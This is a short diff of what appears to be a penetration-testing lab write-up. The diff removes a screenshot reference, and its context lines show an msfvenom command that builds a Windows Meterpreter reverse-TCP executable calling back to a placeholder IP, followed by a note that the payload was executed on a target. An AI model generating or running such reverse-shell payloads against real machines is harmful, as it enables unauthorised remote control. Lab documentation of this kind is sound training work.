@@ -59,10 +59,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o shel
 
 The payload (`shell.exe`) was transferred to the Windows machine and executed.
 
----
 
-
-![Payload Execution](../Screenshots/msf2.png)
 
 ---
 
